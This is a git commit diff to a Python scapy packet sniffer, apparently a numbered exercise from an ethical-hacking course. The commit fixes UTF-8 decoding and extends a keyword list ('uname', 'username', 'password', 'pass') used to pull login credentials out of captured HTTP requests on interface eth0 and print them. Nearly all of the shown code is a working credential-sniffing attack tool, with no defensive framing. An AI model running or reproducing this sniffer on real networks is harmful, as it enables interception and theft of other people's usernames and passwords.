bd5d2fc948cf8540167b5277f9f9e31c0352eac0
Maksatbek Bolushov <maksnurgazy@gmail.com>
2022-04-04 14:20:32 -0400

    packet sniffer decoding error fixed.

--- 06_packet_sniffer/packet_sniffer.py
+++ 06_packet_sniffer/packet_sniffer.py
@@ -7,14 +7,14 @@ def sniff(interface):
 
 
 def get_url(packet):
-    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode("utf-8")
 
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         # print(packet[scapy.Raw].load)
-        load = packet[scapy.Raw].load
-        keywords = ["username", "user", "login", "password", "pass"]
+        load = packet[scapy.Raw].load.decode("utf-8")
+        keywords = ["uname", "username", "user", "login", "password", "pass"]
         for keyword in keywords:
             if keyword in load:
                 return load
@@ -23,9 +23,11 @@ def get_login_info(packet):
 def process_sniffed_packed(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+] HTTP Request >> " + url)
+        if url:
+            print("[+] HTTP Request >> " + url)
         login_info = get_login_info(packet)
-        print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
 
 sniff("eth0")
